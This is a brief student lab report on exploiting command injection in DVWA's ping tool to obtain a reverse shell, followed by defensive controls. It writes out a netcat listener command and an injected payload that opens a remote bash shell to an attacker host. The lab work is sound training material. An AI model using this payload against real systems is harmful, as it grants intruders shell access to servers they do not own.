# INT302 Lab 9: Reverse Shell via Netcat

## Overview
This report documents exploiting a Command Injection vulnerability in DVWA to gain a reverse shell.

## Exploitation Steps
1.  *Vulnerability:* DVWA's ping tool failed to sanitize user input.
2.  *Listener:* Started a Netcat listener on Kali (nc -lvnp 4444).
3.  *Payload:* Injected ; nc [KALI_IP] 4444 -e /bin/bash into the input field.
4.  *Shell:* Successfully caught the connection and obtained a shell as the www-data user.

## Post-Exploitation
*   Ran whoami, id, and uname -a to gather system information.
*   Confirmed the target's OS and network interfaces.

## Defensive Controls
*   *Input Validation:* Strictly sanitize user input (e.g., allow only valid IP addresses).
*   *Least Privilege:* Restrict the web server's permissions so it cannot spawn shells.
*   *WAF:* Block command injection payloads.
